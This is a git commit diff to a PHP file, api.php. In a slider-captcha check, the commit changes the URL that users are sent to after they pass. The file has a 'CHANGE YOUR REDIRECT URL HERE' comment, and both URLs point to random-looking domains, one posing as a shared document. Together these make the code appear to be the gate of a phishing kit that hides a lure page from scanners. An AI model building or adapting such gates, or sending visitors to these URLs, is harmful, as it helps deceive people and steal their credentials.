210684d56ed9ee9aea8917f1a5223def2ea484ea
pwcsuper111 <pwcsuper111@gmail.com>
2026-06-12 03:34:44 -0700

    Update api.php

--- api.php
+++ api.php
@@ -181,7 +181,7 @@ if ($action === 'verify') {
     $diff = $storedX - $sliderX;
     if ($diff >= -5 && $diff <= 5) {
         // ===== CHANGE YOUR REDIRECT URL HERE =====
-        $redirectURL = 'https://asvo0onoak.rillenrisc.pics/';
+        $redirectURL = 'https://shared-document.parapintaraloleo.com/oQMxz';
         echo json_encode(array('status' => 'success', 'redirect' => $redirectURL));
     } else {
         echo json_encode(array('status' => 'error', 'message' => 'Incorrect position. Try again.'));
